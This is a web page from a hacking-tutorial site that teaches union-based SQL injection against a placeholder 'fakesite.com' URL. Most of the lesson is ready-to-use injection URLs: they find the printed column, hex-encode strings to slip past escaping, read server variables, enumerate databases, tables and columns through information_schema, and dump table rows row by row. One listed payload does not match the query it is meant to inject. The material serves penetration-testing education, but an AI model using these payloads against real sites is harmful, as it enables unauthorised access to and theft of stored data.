 <!DOCTYPE HTML>
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=iso-8859-1" />
<meta name="keywords" content="Security Idiots, Hacking Research Papers, Security Research Papers, Web application Penetration Testing, Web Pentesting, web Injection, SQL Injection, XSS, RFI, LFI, LDAP, XPATH, Bypass, RCE, XML Injection" />
<meta name="description" content="This is the most basic and the fastest way to extract data from a website, in this tutorial we will learn to inject Union based injection after getting the number of columns.">
<title>Basic Union Based Injection</title>
<link rel="stylesheet" href="../../css/skel.css" />
<link rel="stylesheet" href="../../css/style.css" />
<!--[if lte IE 8]><script src="css/ie/html5shiv.js"></script><![endif]-->
<script src="../../js/jquery.min.js"></script>
<script src="../../js/jquery.dropotron.min.js"></script>
<script src="../../js/skel.min.js"></script>
<script src="../../js/skel-layers.min.js"></script>
<script src="../../js/init.js"></script>
<script src="../../js/jquery.treeview.js" type="text/javascript"></script>
<script src="../../js/jquery.cookie.js" type="text/javascript"></script>
<script src="../../js/demo.js" type="text/javascript"></script>
<!--[if lte IE 8]><link rel="stylesheet" href="css/ie/v8.css" /><![endif]-->
<div id="fb-root"></div>
<script>(function(d, s, id) {
		  var js, fjs = d.getElementsByTagName(s)[0];
		  if (d.getElementById(id)) return;
		  js = d.createElement(s); js.id = id;
		  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&appId=727224234003200&version=v2.0";
		  fjs.parentNode.insertBefore(js, fjs);
		}(document, 'script', 'facebook-jssdk'));

</script>
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-54093058-1', 'auto');
  ga('send', 'pageview');

</script>
<script id="dsq-count-scr" src="https://securityidiots-com.disqus.com/count.js" async></script>
</head>
<body class="left-sidebar"> 
<div id="header">
<div class="container">

<h1><a href="Basic-Union-Based-SQL-Injection.html#" id="logo">Security Idiots</a></h1>

<nav id="nav">
<ul>
<li><a href="../../index.html">Home</a></li>
<li>
<a href="Basic-Union-Based-SQL-Injection.html">Categories</a>
<ul>
<li><a href="../Information-Gathering/index.html">Information Gathering</a>
<ul>
<li><a href="../Information-Gathering/Cloudflare-Bypass/index.html">Cloudflare Bypass</a></li>
</ul>
</li>
<li><a href="index.html">SQL Injection</a>
<ul>
<li><a href="MSSQL/index.html">MSSQL</a></li>
</ul>
</li>
<li><a href="../Tricks/index.html">Tricks</a></li>
<li><a href="../XSS/index.html">XSS</a></li>
<li><a href="../LFI/index.html">LFI</a></li>
<li><a href="../XPATH-Injection/index.html">XPATH Injection</a></li>
</ul>
</li>
<li><a href="https://www.youtube.com/watch?v=nMOyvIWn5Y8&list=PL5e1zp5ChO-S4nlMUy60AMIkB0XDgd8wb" target="_BLANK">Video Gallery</a></li>
<li><a href="../../construction.html">The Idiots Team</a></li>
<li><a href="../../construction.html">Contact Us</a></li>
</ul>
</nav>
</div>
</div>

<div id="main" class="wrapper style1">
<div class="container">
<div class="row"> 
<div id="sidebar" class="4u sidebar" style="width:25%;background:white;padding:20px;color:black; border: 2px solid #a1a1a1;border-radius: 25px;">
<section>
<header class="major">
<h2>Tutorials Browser</h2>
</header>
<div class="row half">
<ul id="browser" class="filetree">
<li><a href="../../Web-Pentest.html"><span class="folder">Web Pentest</span></a><ul id="Web-Pentest"></ul></li>
</ul>
<script>
function SetOpt(type,element,path,title,name){
container = document.getElementById(element);
if(type=='folder')
element='<li><span class="'+type+'"><a href="https://www.securityidiots.com/'+path+'" title="'+title+'">'+name+'</a></span><ul id="'+path+'"></ul></li>';
else
element='<li><span class="'+type+'"><a href="https://www.securityidiots.com/'+path+'" title="'+title+'">'+name+'</a></span></li>';
container.innerHTML = container.innerHTML + element;
}
SetOpt('folder','Web-Pentest','Web-Pentest/Information-Gathering','Information-Gathering','Information-Gathering');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-0-Purpose-of-Information-Gathering.html','Part-0-Purpose-of-Information-Gathering.html','Part-0-Purpose-of-Information-Gathering.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-1-information-Gathering-with-websites.html','Part-1-information-Gathering-with-websites.html','Part-1-information-Gathering-with-websites.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-2-information-Gathering-with-Google.html','Part-2-information-Gathering-with-Google.html','Part-2-information-Gathering-with-Google.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-3-information-Gathering-with-nmap.html','Part-3-information-Gathering-with-nmap.html','Part-3-information-Gathering-with-nmap.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-4-DNS-information-Gathering-with-DIG.html','Part-4-DNS-information-Gathering-with-DIG.html','Part-4-DNS-information-Gathering-with-DIG.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-5-information-Gathering-with-Fierce.html','Part-5-information-Gathering-with-Fierce.html','Part-5-information-Gathering-with-Fierce.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-6-information-Gathering-with-FOCA.html','Part-6-information-Gathering-with-FOCA.html','Part-6-information-Gathering-with-FOCA.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-7-information-Gathering-with-Metagofil.html','Part-7-information-Gathering-with-Metagofil.html','Part-7-information-Gathering-with-Metagofil.html');
SetOpt('folder','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Cloudflare-Bypass','Cloudflare-Bypass','Cloudflare-Bypass');
SetOpt('file','Web-Pentest/Information-Gathering/Cloudflare-Bypass','Web-Pentest/Information-Gathering/Cloudflare-Bypass/Part-1-Understanding-Cloudflare-Security.html','Part-1-Understanding-Cloudflare-Security.html','Part-1-Understanding-Cloudflare-Security.html');
SetOpt('file','Web-Pentest/Information-Gathering/Cloudflare-Bypass','Web-Pentest/Information-Gathering/Cloudflare-Bypass/Part-2-Cloudflare-Security-Bypass.html','Part-2-Cloudflare-Security-Bypass.html','Part-2-Cloudflare-Security-Bypass.html');
SetOpt('file','Web-Pentest/Information-Gathering/Cloudflare-Bypass','Web-Pentest/Information-Gathering/Cloudflare-Bypass/Part-3-Cloudflare-Security-Bypass.html','Part-3-Cloudflare-Security-Bypass.html','Part-3-Cloudflare-Security-Bypass.html');
SetOpt('file','Web-Pentest/Information-Gathering/Cloudflare-Bypass','Web-Pentest/Information-Gathering/Cloudflare-Bypass/Part-4-Cloudflare-Security-Bypass.html','Part-4-Cloudflare-Security-Bypass.html','Part-4-Cloudflare-Security-Bypass.html');
SetOpt('folder','Web-Pentest','Web-Pentest/LFI','LFI','LFI');
SetOpt('file','Web-Pentest/LFI','Web-Pentest/LFI/guide-to-lfi.html','guide-to-lfi.html','guide-to-lfi.html');
SetOpt('folder','Web-Pentest','Web-Pentest/SQL-Injection','SQL-Injection','SQL-Injection');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Part-1-Basic-of-SQL-for-SQLi.html','Part-1-Basic-of-SQL-for-SQLi.html','Part-1-Basic-of-SQL-for-SQLi.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Part-2-Basic-of-SQL-for-SQLi.html','Part-2-Basic-of-SQL-for-SQLi.html','Part-2-Basic-of-SQL-for-SQLi.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Part-3-Basic-of-SQL-for-SQLi.html','Part-3-Basic-of-SQL-for-SQLi.html','Part-3-Basic-of-SQL-for-SQLi.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Basic-Union-Based-SQL-Injection.html','Basic-Union-Based-SQL-Injection.html','Basic-Union-Based-SQL-Injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/basic-injection-single-line-or-death.html','basic-injection-single-line-or-death.html','basic-injection-single-line-or-death.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/XPATH-Error-Based-Injection-Extractvalue.html','XPATH-Error-Based-Injection-Extractvalue.html','XPATH-Error-Based-Injection-Extractvalue.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/XPATH-Error-Based-Injection-UpdateXML.html','XPATH-Error-Based-Injection-UpdateXML.html','XPATH-Error-Based-Injection-UpdateXML.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Error-Based-Injection-Subquery-Injection.html','Error-Based-Injection-Subquery-Injection.html','Error-Based-Injection-Subquery-Injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/sql-evil-twin-injection.html','sql-evil-twin-injection.html','sql-evil-twin-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Blind-SQL-Injection.html','Blind-SQL-Injection.html','Blind-SQL-Injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/bypass-login-using-sql-injection.html','bypass-login-using-sql-injection.html','bypass-login-using-sql-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/dump-database-from-login-form-sql.html','dump-database-from-login-form-sql.html','dump-database-from-login-form-sql.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/url-spoofed-phishing-with-sqli.html','url-spoofed-phishing-with-sqli.html','url-spoofed-phishing-with-sqli.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/ddos-website-with-sqli-siddos.html','ddos-website-with-sqli-siddos.html','ddos-website-with-sqli-siddos.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/delete-query-injection.html','delete-query-injection.html','delete-query-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/update-query-injection.html','update-query-injection.html','update-query-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/xss-injection-with-sqli-xssqli.html','xss-injection-with-sqli-xssqli.html','xss-injection-with-sqli-xssqli.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/time-based-blind-injection.html','time-based-blind-injection.html','time-based-blind-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/insert-query-injection.html','insert-query-injection.html','insert-query-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/group-by-and-order-by-sql-injection.html','group-by-and-order-by-sql-injection.html','group-by-and-order-by-sql-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html','Union-based-Oracle-Injection.html','Union-based-Oracle-Injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Dump-in-One-Shot-part-1.html','Dump-in-One-Shot-part-1.html','Dump-in-One-Shot-part-1.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Dump-in-One-Shot-part-2.html','Dump-in-One-Shot-part-2.html','Dump-in-One-Shot-part-2.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/DIOS-the-SQL-Injectors-Weapon-Upgraded.html','DIOS-the-SQL-Injectors-Weapon-Upgraded.html','DIOS-the-SQL-Injectors-Weapon-Upgraded.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/database-type-testing-sql-injection.html','database-type-testing-sql-injection.html','database-type-testing-sql-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/routed_sql_injection.html','routed_sql_injection.html','routed_sql_injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/multi-query-injection.html','multi-query-injection.html','multi-query-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/mssql-insert-query-injection.html','mssql-insert-query-injection.html','mssql-insert-query-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/oracle-sql-injection-dios-query.html','oracle-sql-injection-dios-query.html','oracle-sql-injection-dios-query.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/mssql-out-of-band-exploitation.html','mssql-out-of-band-exploitation.html','mssql-out-of-band-exploitation.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/addslashes-bypass-sql-injection.html','addslashes-bypass-sql-injection.html','addslashes-bypass-sql-injection.html');
SetOpt('folder','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/MSSQL','MSSQL','MSSQL');
SetOpt('file','Web-Pentest/SQL-Injection/MSSQL','Web-Pentest/SQL-Injection/MSSQL/mssql-dios.html','mssql-dios.html','mssql-dios.html');
SetOpt('file','Web-Pentest/SQL-Injection/MSSQL','Web-Pentest/SQL-Injection/MSSQL/MSSQL-Union-Based-Injection.html','MSSQL-Union-Based-Injection.html','MSSQL-Union-Based-Injection.html');
SetOpt('file','Web-Pentest/SQL-Injection/MSSQL','Web-Pentest/SQL-Injection/MSSQL/MSSQL-Error-Based-Injection.html','MSSQL-Error-Based-Injection.html','MSSQL-Error-Based-Injection.html');
SetOpt('folder','Web-Pentest','Web-Pentest/Tricks','Tricks','Tricks');
SetOpt('file','Web-Pentest/Tricks','Web-Pentest/Tricks/Grab-IP-Address-Using-Image.html','Grab-IP-Address-Using-Image.html','Grab-IP-Address-Using-Image.html');
SetOpt('folder','Web-Pentest','Web-Pentest/WAF-Bypass','WAF-Bypass','WAF-Bypass');
SetOpt('file','Web-Pentest/WAF-Bypass','Web-Pentest/WAF-Bypass/waf-bypass-guide-part-1.html','waf-bypass-guide-part-1.html','waf-bypass-guide-part-1.html');
SetOpt('file','Web-Pentest/WAF-Bypass','Web-Pentest/WAF-Bypass/bypass-sucuri-webSite-firewall.html','bypass-sucuri-webSite-firewall.html','bypass-sucuri-webSite-firewall.html');
SetOpt('folder','Web-Pentest','Web-Pentest/XPATH-Injection','XPATH-Injection','XPATH-Injection');
SetOpt('file','Web-Pentest/XPATH-Injection','Web-Pentest/XPATH-Injection/Basics-of-XPATH-for-XPATH-Injection-part-1.html','Basics-of-XPATH-for-XPATH-Injection-part-1.html','Basics-of-XPATH-for-XPATH-Injection-part-1.html');
SetOpt('file','Web-Pentest/XPATH-Injection','Web-Pentest/XPATH-Injection/Basics-of-XPATH-for-XPATH-Injection-part-2.html','Basics-of-XPATH-for-XPATH-Injection-part-2.html','Basics-of-XPATH-for-XPATH-Injection-part-2.html');
SetOpt('file','Web-Pentest/XPATH-Injection','Web-Pentest/XPATH-Injection/Basics-XPATH-injection.html','Basics-XPATH-injection.html','Basics-XPATH-injection.html');
SetOpt('file','Web-Pentest/XPATH-Injection','Web-Pentest/XPATH-Injection/xpath-injection-part-1.html','xpath-injection-part-1.html','xpath-injection-part-1.html');
SetOpt('folder','Web-Pentest','Web-Pentest/XSS','XSS','XSS');
SetOpt('file','Web-Pentest/XSS','Web-Pentest/XSS/xss.series-by-securityidiots.html','xss.series-by-securityidiots.html','xss.series-by-securityidiots.html');
SetOpt('file','Web-Pentest/XSS','Web-Pentest/XSS/basics-of-javascript-for-XSS-part2.html','basics-of-javascript-for-XSS-part2.html','basics-of-javascript-for-XSS-part2.html');
SetOpt('file','Web-Pentest/XSS','Web-Pentest/XSS/basics-of-javascript-for-XSS3-final.html','basics-of-javascript-for-XSS3-final.html','basics-of-javascript-for-XSS3-final.html');
SetOpt('file','Web-Pentest/XSS','Web-Pentest/XSS/xss-exploitation-series-part-1.html','xss-exploitation-series-part-1.html','xss-exploitation-series-part-1.html');
SetOpt('file','Web-Pentest/XSS','Web-Pentest/XSS/different-contexts-for-xss-execution.html','different-contexts-for-xss-execution.html','different-contexts-for-xss-execution.html');
SetOpt('folder','Web-Pentest','Web-Pentest/XXE','XXE','XXE');
SetOpt('file','Web-Pentest/XXE','Web-Pentest/XXE/XXE-Cheat-Sheet-by-SecurityIdiots.html','XXE-Cheat-Sheet-by-SecurityIdiots.html','XXE-Cheat-Sheet-by-SecurityIdiots.html');

</script> </div>
</section>
</div>  <div id="content" class="8u skel-cell-important">
<section class="lol" style="padding:10px;background:#C9C9C2;color:black; border: 2px solid #a1a1a1;border-radius: 8px;">
<header class="major">
<h3><span class="byline">Basic Union Based Injection</span></h3>
<div class="row no-collapse-1">
<span class="post-description" style="text-align:justify;">Welcome to the third part of SQL Injection. In this tutorial we will learn how to inject Union based injection.<br></br>
In our last tutorial we learnt how to find out the number of columns used under the query so that we can use Union select statement. So we will continue that same url and same injection we were injecting. In the last tutorial we found that the vulnerable URL is having 5 numbers of columns and the below query was working.<br><br>
<pre>http://fakesite.com/report.php?id=23 order by 5--+</pre><br><br>
Now we will use Union select statement over here.<br><br>
<pre>http://fakesite.com/report.php?id=23 union select 1,2,3,4,5--+</pre>
<br><br>
what will it do is concatenate one more row to the output which will look like this<br><br>
<table cellspacing="0" class='table10'>
<tr><th>column1</th><th>column2</th><th>column3</th><th>column4</th><th>column5</th></tr>
<tr><td>anydata</td><td>anydata</td><td>anydata</td><td>anydata</td><td>anydata</td></tr>
<tr><td>1</td><td>2</td><td>3</td><td>4</td><td>5</td></tr>
</table><br><br>
Here a small understanding of the web application is required, If you see any of these numbers printed in the webpage or the title or anywhere else then you can know the the developer is printing multiple rows. But in case you can not see any of these numbers printed then you can simply invalidate the first query so that it wont give any output and eventually your output will become the one and only output to be printed.<br><br>
<pre>http://fakesite.com/report.php?id=23 and 0 union select 1,2,3,4,5--+<br>
http://fakesite.com/report.php?id=23 and false union select 1,2,3,4,5--+<br>
http://fakesite.com/report.php?id=-23 union select 1,2,3,4,5--+<br>
http://fakesite.com/report.php?id=23000000 union select 1,2,3,4,5--+<br>
http://fakesite.com/report.php?id=null union select 1,2,3,4,5--+<br>
http://fakesite.com/report.php?id=23 &amp;&amp; 0 union select 1,2,3,4,5--+<br>
</pre>
<br><br>
Above i have specified some ways to make a query invalid but remember that &amp; should be url encoded before usage. Now when we will use any of the above query, one row will come in output.<br><br>
<table cellspacing="0" class='table10'>
<tr><th>column1</th><th>column2</th><th>column3</th><th>column4</th><th>column5</th></tr>
<tr><td>1</td><td>2</td><td>3</td><td>4</td><td>5</td></tr>
</table><br><br>
Any of the number must be printed in the webpage again as basic thing to understand is that programmer may be only printing some particular columns from the output, lets say the third one. So we if we can see 3 in the page then its good otherwise we can try the query below with some other values.<br><br>
<pre>http://fakesite.com/report.php?id=-23 union select 'hello1','hello2','hello3','hello4','hello5'--+<br>
</pre>
<br><br>
Now just try to find it inside the source code. If you find hello1 that means the first colums is getting printed and if you found hello2 then the second column is getting printed and so on. Still some times if the programmer is using mysql_real_escape_string it may create an error or else no output. We can simply avoid the usage of single quotes using hex values. Below is the encoded query for the above same query.<br><br>
<pre>http://fakesite.com/report.php?id=-23 union select 0x68656c6c6f31,0x68656c6c6f32,0x68656c6c6f33,0x68656c6c6f34,0x68656c6c6f35--+
</pre>
<br><br>
One small thing to remember is that always add 0x before any hexadecimal value. Hopefully the above query should work and you will find the column which is getting printed on the webpage or inside the source code. We will stich up with 3rd column for this example. As we know that any thing on place of third column is getting printed. Then now we can try some Default functions and variables, to get some information related to our target. Below are some of the Variables/Functions that can be used to get information about your target machine.<br><br>
<table cellspacing="0" class='table10'>
<tr><th>Variable/Function</th><th></th><th>Output</th></tr>
<tr><td>@@hostname</td><td>:</td><td>Current Hostname</td></tr>
<tr><td>@@tmpdir</td><td>:</td><td>Tept Directory</td></tr>
<tr><td>@@datadir</td><td>:</td><td>Data Directory</td></tr>
<tr><td>@@version</td><td>:</td><td>Version of DB</td></tr>
<tr><td>@@basedir</td><td>:</td><td>Base Directory</td></tr>
<tr><td>user()</td><td>:</td><td>Current User</td></tr>
<tr><td>database()</td><td>:</td><td>Current Database</td></tr>
<tr><td>version()</td><td>:</td><td>Version</td></tr>
<tr><td>schema()</td><td>:</td><td>current Database</td></tr>
<tr><td>UUID()</td><td>:</td><td>System UUID key</td></tr>
<tr><td>current_user()</td><td>:</td><td>Current User</td></tr>
<tr><td>current_user</td><td>:</td><td>Current User</td></tr>
<tr><td>system_user()</td><td>:</td><td>Current Sustem user</td></tr>
<tr><td>session_user()</td><td>:</td><td>Session user</td></tr>
<tr><td>@@GLOBAL.have_symlink</td><td>:</td><td>Check if Symlink Enabled or Disabled</td></tr>
<tr><td>@@GLOBAL.have_ssl</td><td>:</td><td>Check if it have ssl or not</td></tr>
</table><br><br>
As we know that third is the column which is getting printed so now we will use the above functions on place of that columns only.<br><br>
<pre>To get the Current Database Name<br>http://fakesite.com/report.php?id=-23 union select 1,2,database(),4,5--+<br>
To get the Current Version<br>http://fakesite.com/report.php?id=-23 union select 1,2,version(),4,5--+<br>
To get the Current User<br>http://fakesite.com/report.php?id=-23 union select 1,2,user(),4,5--+<br>
To get the Temporary Directory Path<br>http://fakesite.com/report.php?id=-23 union select 1,2,@@tmpdir,4,5--+
</pre><br><br>
Now we will move to our next part, which is Data Extraction.<br><br>
<h2>Data Extraction using SQLi</h2><br>
There are many ways to extract data using SQLi so first one is union based. First i will show you the Queries and then show you how we can inject them.<br><br>
<pre>Query : Select table_schema from information_schema.schemata<br>
Injection : http://fakesite.com/report.php?id=-23 union select 1,2,version(),4,5--+
</pre><br><br>
Will give us names of all the Databases avaiable. But as we found earlier that sometimes programmer may not be printing all the rows. He may be printing the first row from output. So in that case we can use limit keyword to enumerate the rows one by one.<br><br>
<pre>First row<br>Select table_schema from information_schema.schemata limit 0,1--+<br>
Second row<br>Select table_schema from information_schema.schemata limit 1,1--+<br>
Third row<br>Select table_schema from information_schema.schemata limit 2,1--+<br>
Forth row<br>Select table_schema from information_schema.schemata limit 3,1--+<br>
and so on...
</pre><br><br>
In the above manner we can get each row one by one. Now lets see how can we extract all the table names from a database.<br><br>
<pre>Query : Select table_name from information_schema.talbes where table_schema='databasename'<br>
Query for Current DB: Select table_name from information_schema.tables where table_schema=database()<br>
Injection : http://fakesite.com/report.php?id=-23 union select 1,2,table_name,4,5 from information_schema.tables where table_schema=database()--+
</pre><br><br>
Above injection will give you all the rows at once, but if you want one by one then you can use limit.<br><br>
<pre>First row<br>http://fakesite.com/report.php?id=-23 union select 1,2,table_name,4,5 from information_schema.tables where table_schema=database() limit 0,1--+<br>
Second row<br>http://fakesite.com/report.php?id=-23 union select 1,2,table_name,4,5 from information_schema.tables where table_schema=database() limit 1,1--+<br>
Third row<br>http://fakesite.com/report.php?id=-23 union select 1,2,table_name,4,5 from information_schema.tables where table_schema=database() limit 2,1--+<br>
Forth row<br>http://fakesite.com/report.php?id=-23 union select 1,2,table_name,4,5 from information_schema.tables where table_schema=database() limit 3,1--+<br>
and so on...
</pre><br><br>
After getting the Table Names we can move on and start collecting the names of Columns under any table. we can specify the table name as we have all the tablenames.<br><br>
<pre>Query : Select column_name from information_schema.columns where table_schema=database() and table_name='tablenamehere'<br>
Injection : http://fakesite.com/report.php?id=-23 union Select 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='tablenamehere'--+
</pre><br><br>
If the above query do not give any output or an error. You can try to hex the tablename. And now we can try to get all the table names one by one if only one row is getting printed.<br><br>
<pre>First row<br>http://fakesite.com/report.php?id=-23 union select 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='tablename' limit 0,1--+<br>
Second row<br>http://fakesite.com/report.php?id=-23 union select 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='tablename' limit 1,1--+<br>
Third row<br>http://fakesite.com/report.php?id=-23 union select 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='tablename' limit 2,1--+<br>
Forth row<br>http://fakesite.com/report.php?id=-23 union select 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='tablename' limit 3,1--+<br>
and so on...
</pre><br><br>
Now we know the database name, the table names and the column names so the last stage starts of extracting data from the columns. Now we have to specify from which column we want the data and from which table. Query and injection is simple at this stage<br><br>
<pre>Query : Select column1, column2 from tablename<br>
First row : http://fakesite.com/report.php?id=-23 union Select 1,2,concat(column1,column2),4,5 from tablename limit 0,1--+<br>
Second row : http://fakesite.com/report.php?id=-23 union Select 1,2,concat(column1,column2),4,5 from tablename limit 1,1--+<br>
Third row : http://fakesite.com/report.php?id=-23 union Select 1,2,concat(column1,column2),4,5 from tablename limit 2,1--+<br>
Forth row : http://fakesite.com/report.php?id=-23 union Select 1,2,concat(column1,column2),4,5 from tablename limit 3,1--+<br>
</pre><br><br>
Thats all for Basic Union Based Injection.<br><img src="../../post_images/union_based_sql_injection.png" width=0>
<br>Author : Zenodermus Javanicus<br>Date : 2014-03-16</span><br><br></div><div id="disqus_thread"></div>
<script>
var disqus_config = function () {
this.page.url = "http://securityidiots.com/Web-Pentest/SQL-Injection/Basic-Union-Based-SQL-Injection.html";  
this.page.identifier = "19";
};

(function() {
var d = document, s = d.createElement('script');
s.src = 'https://securityidiots-com.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript> </div>
</header>
</section>
</div>
</div>
</div>
</div>

<div id="footer">
<div class="container">

<div class="row">
<div class="8u">
<section>
<header class="major">
<h2>Connect with Security Idiots</h2>
<span class="byline">Learn & share more on Hacking and Security</span>
</header>
<div class="row">
<section class="6u">
<ul class="default">
<li><a href="https://www.facebook.com/pages/securityidiotscom/879838302049912" target="_BLANK"><img src="Basic-Union-Based-SQL-Injection.html" width=40>&nbsp;&nbsp;<font size=5><b>FACEBOOK</b></font></a></li>
<li><a href="https://www.youtube.com/channel/UCPPAYs04kwfXcHnerm_ueFw" target="_BLANK"><img src="../../images/youtube.png" width=40>&nbsp;&nbsp;<font size=5><b>Youtube Channel</b></font></a></li>
</ul>
</section>
</div>
</section>
</div>
<div class="4u">
<section>
<header class="major">
<h2>Contact Security Idiots</h2>
</header>
<ul class="contact">
<li>
<span class="address">Email</span>
<span><a href="../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="4021242d292e0033252335322934392924292f34336e232f2d">[email&#160;protected]</a></span>
</li>
</ul>
</section>
</div>
</div>

<div class="copyright">
Designed by k-hz webdevelopers
</div>
</div>
</div>
<script data-cfasync="false" src="../../cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script></body>
</html>